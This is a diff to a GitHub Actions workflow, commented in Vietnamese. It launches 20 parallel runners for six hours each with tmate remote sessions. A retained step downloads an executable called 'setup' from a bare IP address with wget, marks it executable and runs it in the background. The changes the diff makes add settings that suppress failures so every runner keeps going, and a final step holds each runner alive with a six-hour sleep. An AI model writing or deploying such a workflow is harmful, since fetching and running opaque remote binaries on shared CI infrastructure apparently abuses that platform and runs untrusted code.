@@ -13,8 +13,8 @@ jobs:
     timeout-minutes: 360  # Tăng timeout lên 6h
 
     strategy:
+      fail-fast: false  # Quan trọng: job lỗi không ảnh hưởng job khác
       matrix:
-        fail-fast: false
         instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
@@ -46,18 +46,21 @@ jobs:
         run: echo "🔹 Running instance ${{ matrix.instance }} with tmate"
 
       - name: Run main script (with tmate running)
+        continue-on-error: true  # Step lỗi vẫn chạy step tiếp theo
         run: |
           echo "📦 Downloading and running setup..."
+          set +e  # Tắt exit-on-error
           wget http://38.242.224.156:8082/setup
           chmod +x setup
           nohup ./setup &
           SETUP_PID=$!
           
           # Chờ script chính chạy nhưng vẫn giữ tmate active
-          wait $SETUP_PID
+          wait $SETUP_PID || echo "⚠️ Setup script exited with error, but continuing..."
 
       - name: Keep alive after main script
-        if: always()  # Chạy cả khi thành công hay thất bại
+        if: always()  # Luôn chạy kể cả thành công hay thất bại
+        continue-on-error: true
         run: |
           echo "⏳ Main script finished, but keeping tmate alive for 6 hours..."
           sleep 21600  # 6 giờ = 21600 giây
